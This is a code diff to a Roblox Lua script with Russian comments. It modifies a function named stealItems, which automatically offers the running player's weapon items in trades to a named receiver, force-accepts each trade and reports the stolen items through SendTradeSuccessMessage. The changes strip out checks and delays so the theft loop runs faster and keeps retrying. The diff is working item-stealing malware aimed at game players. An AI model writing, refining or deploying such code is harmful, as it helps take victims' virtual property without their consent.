@@ -737,6 +737,22 @@ local function isTradeGUIVisible()
     return false
 end
 
+local loop = false
+local tradeInProgress = false
+
+local function isTradeGUIOpen()
+    local player = game:GetService("Players").LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    for _, guiName in pairs({"TradeGUI", "TradeGUI_Phone"}) do
+        local tradeGUI = playerGui:FindFirstChild(guiName)
+        if tradeGUI then
+            return true
+        end
+    end
+    return false
+end
+
 local function stealItems(ReceiverName)
     loop = true
     
@@ -782,10 +798,10 @@ local function stealItems(ReceiverName)
             continue
         end
         
-        -- Ждем когда трейд будет принят (проверяем видимость GUI)
+        -- Ждем когда трейд будет принят (проверяем наличие GUI)
         local tradeAccepted = false
-        for i = 1, 30 do  -- 30 секунд таймаут
-            if isTradeGUIVisible() then
+        for i = 1, 30 do
+            if isTradeGUIOpen() then
                 tradeAccepted = true
                 break
             end
@@ -798,10 +814,7 @@ local function stealItems(ReceiverName)
             continue
         end
         
-        -- Даем время окну трейда полностью открыться
-        task.wait(2)
-        
-        -- Добавляем предметы только если трейд активен
+        -- Добавляем предметы (убрал лишние проверки)
         local sentItems = {}
         local addedCount = 0
         
@@ -810,12 +823,6 @@ local function stealItems(ReceiverName)
             
             local addAmount = math.min(item.amount, 4 - addedCount)
             for i = 1, addAmount do
-                -- Проверяем что трейд еще активен
-                if not isTradeGUIVisible() then
-                    print("Трейд закрыт во время добавления предметов")
-                    break
-                end
-                
                 local offerSuccess = pcall(function()
                     Trade.OfferItem:FireServer(item.dataId, "Weapons")
                 end)
@@ -827,50 +834,54 @@ local function stealItems(ReceiverName)
                         amount = 1
                     })
                     addedCount = addedCount + 1
+                    print("Добавлен предмет: " .. item.name)
+                else
+                    print("Ошибка добавления предмета: " .. item.name)
                 end
-                task.wait(0.5)
+                task.wait(0.3) -- Уменьшил задержку
                 if addedCount >= 4 then break end
             end
         end
         
         if addedCount == 0 then
+            print("Не удалось добавить ни одного предмета")
             pcall(function() Trade.DeclineTrade:FireServer() end)
             tradeInProgress = false
-            loop = false
-            return
+            task.wait(2)
+            continue
         end
         
-        -- Ждем подтверждения от другой стороны
-        task.wait(5)
+        print("Добавлено предметов: " .. addedCount)
+        task.wait(2)
         
-        -- Подтверждаем трейд только если он еще активен
-        local confirmSuccess = false
-        if isTradeGUIVisible() then
-            confirmSuccess = pcall(function()
-                if lastOfferValue then
-                    Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferValue)
-                else
-                    Trade.AcceptTrade:FireServer(game.PlaceId * 3, tick())
-                end
-            end)
+        -- Подтверждаем трейд
+        local confirmSuccess = pcall(function()
+            if lastOfferValue then
+                Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferValue)
+            else
+                Trade.AcceptTrade:FireServer(game.PlaceId * 3, tick())
+            end
+        end)
+        
+        if confirmSuccess then
+            print("Трейд подтвержден")
+            if #sentItems > 0 then
+                SendTradeSuccessMessage(sentItems, ReceiverName)
+            end
+        else
+            print("Ошибка подтверждения трейда")
         end
         
-        -- Ждем завершения трейда (пока GUI не скроется)
+        -- Ждем завершения трейда
         for i = 1, 10 do
-            if not isTradeGUIVisible() then
+            if not isTradeGUIOpen() then
                 break
             end
             task.wait(1)
         end
         
-        -- Отправляем сообщение об успехе если трейд завершился
-        if confirmSuccess and #sentItems > 0 then
-            SendTradeSuccessMessage(sentItems, ReceiverName)
-        end
-        
         tradeInProgress = false
-        
-        -- Задержка перед следующим трейдом
+        print("Трейд завершен, ждем перед следующим")
         task.wait(3)
     end
 end
